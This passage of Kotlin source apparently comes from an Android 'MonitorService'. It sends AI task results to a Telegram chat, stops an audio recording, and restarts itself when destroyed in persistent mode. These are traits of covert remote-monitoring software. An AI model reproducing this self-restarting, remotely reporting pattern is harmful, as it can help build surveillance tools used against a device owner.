                        summary.append("Error: ${r["error"]}\n")
                    }
                    summary.append("\n")
                }

                val msg = summary.toString()
                if (latch.await(60, TimeUnit.SECONDS)) {
                    callback.result = msg
                    callback.status = "completed"
                    callback.latch.countDown()
                    sendTelegramDocument(chatId, "ai_result.txt", msg, "AI Task Result")
                } else {
                    sendTelegramMessage(chatId, "AI task $taskId timed out")
                }
            } catch (e: Exception) {
                Log.e("AI", "Error", e)
                sendTelegramMessage(chatId, "AI Error: ${e.message}")
            } finally {
                telegramCallbacks.remove(taskId)
            }
        }, "ai-$taskId").start()
    }

    override fun onBind(intent: Intent): IBinder = binder

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = if (persistentMode) START_STICKY else START_NOT_STICKY

    override fun onDestroy(): Unit {
        running = false
        wakeLock?.release()
        pollThread?.interrupt()
        stopRecording()
        commandReceiver?.let { try { unregisterReceiver(it) } catch (e: Exception) {} }
        if (persistentMode) startService(Intent(this, MonitorService::class.java))
        super.onDestroy()
    }
}
